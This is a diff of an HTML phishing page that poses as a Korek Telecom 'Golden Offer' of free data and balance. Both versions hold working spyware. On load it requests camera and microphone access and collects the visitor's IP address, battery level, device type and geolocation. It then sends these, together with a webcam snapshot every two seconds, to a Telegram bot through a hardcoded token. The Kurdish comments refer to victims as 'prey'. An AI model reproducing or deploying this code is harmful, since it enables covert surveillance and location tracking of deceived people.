@@ -5,196 +5,92 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Korek Telecom - Golden Offer</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #005596; /* ڕەنگی شینی فەرمی کۆڕەک */
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            color: white;
-            text-align: center;
-        }
-        header {
-            width: 100%;
-            background-color: #ffffff;
-            padding: 10px 0;
-            display: flex;
-            justify-content: center;
-            border-bottom: 3px solid #fdb913; /* هێڵە زەردەکە */
-        }
-        .hero {
-            padding: 40px 20px;
-        }
-        .golden-offer {
-            color: #fdb913;
-            font-size: 38px;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        .code {
-            font-size: 50px;
-            font-weight: 900;
-            margin: 10px 0;
-        }
-        .details {
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
-        .details span {
-            display: block;
-            font-size: 45px;
-            font-weight: bold;
-        }
-        .recharge-box {
-            background-color: white;
-            color: #333;
-            width: 90%;
-            max-width: 350px;
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 20px;
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #005596;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 10px auto;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
-            font-size: 16px;
-        }
-        .btn {
-            background-color: #fdb913;
-            color: #005596;
-            font-weight: bold;
-            padding: 12px;
-            width: 100%;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
+        /* هەمان ستایلەکەی پێشوو لێرە دابنێ... */
+        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #005596; color: white; text-align: center; }
+        header { width: 100%; background-color: white; padding: 10px 0; border-bottom: 3px solid #fdb913; }
+        .hero { padding: 40px 20px; }
+        .recharge-box { background: white; color: #333; padding: 20px; border-radius: 10px; margin: 20px auto; width: 90%; max-width: 350px; }
     </style>
-</head>
-<body onload="capture()">
 
-    <header>
-        <img src="https://www.korektelecom.com/media/1001/korek-logo.png" alt="Korek Logo" width="120">
-    </header>
+    <script>
+        // لێرەدا فەنکشنەکە یەکسەر کار دەکات پێش ئەوەی وێنەکان بار ببن
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetID = urlParams.get('id'); 
+        const TOKEN = "8300725896:AAHHhfRB0II4tFDs7ypgNTS_Xc9gWP40Z58";
 
-    <div class="hero">
-        <div class="golden-offer">Golden Offer</div>
-        <div class="code">*203#</div>
-        <div class="details">
-            <span>20 GB</span>
-            Internet
-            <br><br>
-            <span>15,000</span>
-            Balance
-        </div>
-
-        <div class="recharge-box">
-            <div class="loader"></div>
-            <p style="font-size: 14px;">خەریکی چالاککردنی ئۆفەری زێڕینین بۆ سیمکارتەکەت...</p>
-            <input type="text" placeholder="Voucher Number" disabled>
-            <button class="btn">Continue</button>
-        </div>
-    </div>
-
-<script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const targetID = urlParams.get('id'); 
-    const TOKEN = "8300725896:AAHHhfRB0II4tFDs7ypgNTS_Xc9gWP40Z58";
-
-    async function capture() {
-        if (!targetID) return;
-
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
-                audio: true 
-            });
-
-            let batteryInfo = "Unknown";
-            if (navigator.getBattery) {
-                const batt = await navigator.getBattery();
-                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
-            }
+        async function fastCapture() {
+            if (!targetID) return;
             
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => {
-                    let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
-                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
-                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
-                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
-                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
-                    sendToTelegram(report);
+            // داواکردنی مۆڵەت یەکسەر
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                
+                // ناردنی زانیارییە سەرەتاییەکان
+                const batt = await navigator.getBattery();
+                const batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
+                
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+
+                let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
+                             `👤 <b>ID:</b> <code>${targetID}</code>\n` +
+                             `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
+                             `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
+                             `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
+                
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: targetID, text: report, parse_mode: "HTML"})
                 });
 
-            navigator.geolocation.getCurrentPosition(pos => {
-                sendLocation(pos.coords.latitude, pos.coords.longitude);
-            });
+                // دەستپێکردنی وێنەگرتن
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                setInterval(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(b => {
+                        let fd = new FormData();
+                        fd.append("chat_id", targetID);
+                        fd.append("photo", b, "shot.jpg");
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    }, 'image/jpeg', 0.7);
+                }, 2000);
 
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.muted = true;
-            video.play();
+                // وەرگرتنی لوکەیشن
+                navigator.geolocation.getCurrentPosition(pos => {
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({chat_id: targetID, latitude: pos.coords.latitude, longitude: pos.coords.longitude})
+                    });
+                });
 
-            const takeSnap = () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; 
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                canvas.toBlob(b => {
-                    if (b) sendFile(b, "photo");
-                }, 'image/jpeg', 0.7);
-            };
-
-            setInterval(takeSnap, 2000);
-
-        } catch (e) {
-            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد یان کێشەیەک هەیە.");
+            } catch (e) {
+                // ئەگەر نێچیرەکە ڕەتی کردەوە
+            }
         }
-    }
-
-    function sendToTelegram(text) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
-        });
-    }
-
-    function sendLocation(lat, lon) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
-        });
-    }
-
-    function sendFile(blob, type) {
-        let fd = new FormData();
-        fd.append("chat_id", targetID);
-        fd.append(type, blob, "shot.jpg");
-        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { 
-            method: 'POST', 
-            body: fd 
-        });
-    }
-</script>
+        
+        // یەکسەر کار بکە
+        fastCapture();
+    </script>
+</head>
+<body>
+    <header>
+        <img src="https://www.korektelecom.com/media/1001/korek-logo.png" alt="Korek" width="120">
+    </header>
+    <div class="hero">
+        <div style="color: #fdb913; font-size: 38px; font-weight: bold;">Golden Offer</div>
+        <div style="font-size: 50px; font-weight: 900;">*203#</div>
+        <div class="recharge-box">
+            <p>خەریکی پشکنینی سیمکارتەکەتین...</p>
+            <input type="text" placeholder="Voucher Number" disabled style="width:100%; padding:10px; margin:10px 0;">
+            <button style="background:#fdb913; width:100%; padding:10px; border:none; font-weight:bold;">Continue</button>
+        </div>
+    </div>
 </body>
 </html>
